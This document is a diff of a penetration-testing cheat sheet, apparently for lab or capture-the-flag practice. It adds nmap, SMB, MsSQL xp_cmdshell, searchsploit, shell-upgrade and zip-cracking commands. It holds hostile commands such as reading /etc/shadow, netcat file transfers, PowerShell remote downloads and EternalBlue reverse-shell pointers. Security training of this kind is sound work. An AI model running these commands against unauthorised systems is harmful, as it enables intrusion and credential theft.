@@ -19,6 +19,19 @@ toc-title: "Table of Contents"
 
 ## Nmap
 
+Quickstart:
+
+```sh
+nmap -sC -sV --top-ports 20 <IP> -o <FILE>
+nmap -sC -sV --open --reason <IP> -o <FILE>
+```
+
+Full ports scan:
+
+```sh
+nmap -sV -sC -p- -O --open <IP> -o <FILE>
+```
+
 Ping sweep:
 
 ```sh
@@ -37,7 +50,7 @@ Scan for open ports, determine open services:
 nmap --open -sV <IP or Range>
 ```
 
-Scan and run default scrips:
+Scan and run default scripts:
 
 ```sh
 nmap -sC <IP or Range>
@@ -46,6 +59,7 @@ nmap -sC <IP or Range>
 Run a specific script:
 
 ```sh
+# location on Kali: /usr/share/nmap/scripts/
 nmap --script <SCRIPT_NAME> <IP>
 ```
 
@@ -94,16 +108,37 @@ hydra -L users.txt -P pass.txt IP ssh
 * if it's a Wordpress instance look into `wpscan`
 * sometimes an open FTP is also a feature from a running IIS instance which comes with a CalDav instance. Try it out with `davtest` and exploit with `cadaver`
 
+**Reverse proxy misconfiguration**:
+
+* Sometimes, servers have a misconfiured reverse proxy. Thus, you
+need to add the hostnames that resolve to your target IP to your `/etc/hosts`
+file:
+```sh
+<IP> <HOSTNAME>
+```
+
 **Common exploits**:
 
 * XSS
 * SQLi
 * Directory Traversal
 * Default credentials (admin:admin, root:root... Check also the name of the service or the default password for the running application.)
+* if CGI-bin, check for Shellshock (TODO)
 
 [Go to Exploitation](#exploitation)
 
-#### Port 111, 139 open
+#### Port 443 open
+
+* if the server only accepts localhost (you get that through the SSL certificate
+  details), you will need to tunnel your connection through a user (needs already a first access to the server)
+
+**Common exploits**:
+
+* [Heartbleed](https://gist.github.com/10174134.git)
+
+#### Port 111, 139, 445 open
+
+Check for Samba, Netbios or NFS shares.
 
 * Netbios
 
@@ -115,11 +150,31 @@ nbtscan <IP>
 
 * SMB
 
+List services available:
+
+```sh
+smbclient -L <IP>
+smbmap -H <IP>
+```
+
+List permissions:
+
+```sh
+smbclient -H <IP>
+```
+
+List content:
+
+```sh
+smbmap -R -H <IP>
+```
+
 Basic connection:
 
 ```sh
 smbclient //<IP>/<PATH> -U <USER> -P <PASSWORD>
 ```
+
 
 Get all files from remote:
 
@@ -134,7 +189,7 @@ smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
 * ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload
 
 
-#### Existing NFS mount
+* Existing NFS mount
 
 * Mount the file system on your computer:
 ```sh
@@ -144,17 +199,77 @@ mount -o nolock IP:/ $PWD/temp
 
 #### Existing databases
 
-Connect through command line:
+**MsSQL**:
 
 ```sh
 sqsh -S <IP> -U <USER> -P <PASSWORD>
+# known elevation technique for MsSQL
 xp_cmdshell 'whoami';
 go
 ```
 
-#### Existing VNC services
+**MongoDB**:
+
+```sh
+mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
+# get mongo shell
+> db
+> show collections
+> db.task.find()
+> db.task.insert(<EXPLOIT>)
+```
+
+
+
+## NSLookup
+
+Basic lookup:
+
+```sh
+nslookup server <IP>
+```
+
+## Host
+
+Basic usage:
+
+```sh
+host <IP>
+```
+
+Zone transfert:
+
+```sh
+host -l <DOMAIN> <IP>
+```
 
 # Exploitation
+
+## Searchsploit
+
+Basic usage:
+
+```sh
+searchsploit <KEYWORDS>
+```
+
+Copy path to clipboard:
+
+```sh
+searchsploit -p <ID>
+```
+
+Copy to current folder:
+
+```sh
+searchsploit -m <ID>
+```
+
+Get online link instead of local paths:
+
+```sh
+searchsploit -w <KEYWORDS>
+```
 
 ## Shells
 
@@ -180,7 +295,7 @@ sudo nc -nvlp 443 > incoming.exe     # Reciever
 nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
 ```
 
-### Metasploit shells:
+## Metasploit shells:
 
 Windows shell which doesn't break the application for a x86 architecture:
 
@@ -219,6 +334,116 @@ Send request as logged user:
 curl -u <USER> <IP> --data-binary <PAYLOAD>
 ```
 
+### Common Options ([Source](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58))
+
+`-#, --progress-bar`
+        Make curl display a simple progress bar instead of the more informational standard meter.
+
+`-b, --cookie <name=data>`
+        Supply cookie with request. If no `=`, then specifies the cookie file to use (see `-c`).
+
+`-c, --cookie-jar <file name>`
+        File to save response cookies to.
+
+`-d, --data <data>`
+        Send specified data in POST request. Details provided below.
+
+`-f, --fail`
+        Fail silently (don't output HTML error form if returned). 
+
+`-F, --form <name=content>`
+        Submit form data.
+
+`-H, --header <header>`
+        Headers to supply with request.
+
+`-i, --include`
+        Include HTTP headers in the output.
+
+`-I, --head`
+        Fetch headers only.
+
+`-k, --insecure`
+        Allow insecure connections to succeed.
+
+`-L, --location`
+        Follow redirects.
+
+`-o, --output <file>`
+        Write output to <file>. Can use `--create-dirs` in conjunction with this to create any directories
+        specified in the `-o` path.
+
+`-O, --remote-name`
+        Write output to file named like the remote file (only writes to current directory).
+
+`-s, --silent`
+        Silent (quiet) mode. Use with `-S` to force it to show errors.
+
+`-v, --verbose`
+        Provide more information (useful for debugging).
+
+`-w, --write-out <format>`
+        Make curl display information on stdout after a completed transfer. See man page for more details on
+        available variables. Convenient way to force curl to append a newline to output: `-w "\n"` (can add
+        to `~/.curlrc`).
+        
+`-X, --request`
+        The request method to use.
+
+
+### POST
+
+When sending data via a POST or PUT request, two common formats (specified via the `Content-Type` header) are:
+  * `application/json`
+  * `application/x-www-form-urlencoded`
+
+Many APIs will accept both formats, so if you're using `curl` at the command line, it can be a bit easier to use the form urlencoded format instead of json because
+  * the json format requires a bunch of extra quoting
+  * curl will send form urlencoded by default, so for json the `Content-Type` header must be explicitly set
+
+This gist provides examples for using both formats, including how to use sample data files in either format with your `curl` requests.
+
+### curl usage
+
+For sending data with POST and PUT requests, these are common `curl` options:
+
+ * request type
+   * `-X POST`
+   * `-X PUT`
+
+ * content type header
+  * `-H "Content-Type: application/x-www-form-urlencoded"`
+  * `-H "Content-Type: application/json"`
+ 
+* data
+  * form urlencoded: `-d "param1=value1&param2=value2"` or `-d @data.txt`
+  * json: `-d '{"key1":"value1", "key2":"value2"}'` or `-d @data.json`
+  
+### Examples
+
+#### POST application/x-www-form-urlencoded
+
+`application/x-www-form-urlencoded` is the default:
+
+    curl -d "param1=value1&param2=value2" -X POST http://localhost:3000/data
+
+explicit:
+
+    curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/data
+
+with a data file
+ 
+    curl -d "@data.txt" -X POST http://localhost:3000/data
+
+#### POST application/json
+
+    curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data
+    
+with a data file
+ 
+    curl -d "@data.json" -X POST http://localhost:3000/data
+
+
 ## Powershell
 
 Download remote files:
@@ -234,10 +459,13 @@ powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
 ## Improve your shell
 
 * `sh -c uname -a; w; id; /bin/bash -i`
-* ```sh
+* For NMAP versions 2.0 to 5.8:
+```sh
 nmap --interactive
 !sh
 ```
+* `python -c 'import pty; pty.spawn("/bin/bash")'`
+* `stty raw -echo` and then `fg` and `export TERM=xterm`
 
 ## Local Recon
 
@@ -285,7 +513,14 @@ cat /etc/passwd
 cat /etc/shadow
 cat /etc/*-release
 sudo -l
-ps aux
+ps -aux
+```
+
+Run a command as a user:
+
+```sh
+sudo -u <USER>
+sudo -i -u <USER>
 ```
 
 Network discover:
@@ -304,6 +539,39 @@ for i in `seq 1 254`; do ping 192.168.1.$i; done
 
 * [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
 * [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+
+### Send files to remote hosts
+
+#### Powershell
+
+```powershell
+Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
+```
+
+
+## Cracking
+
+Decompress with tar:
+
+```sh
+tar -C <DEST> -xvf <FILE>
+```
+
+### John
+
+### Hydra
+
+### Binwalk
+
+### Steghide
+
+### Fcrackzip
+
+Run as dictionnary mode, try to decompress the target:
+
+```sh
+fcrackzip -u -D -p <Wordlist> <FILE>
+```
 
 # Custom Scripts
 
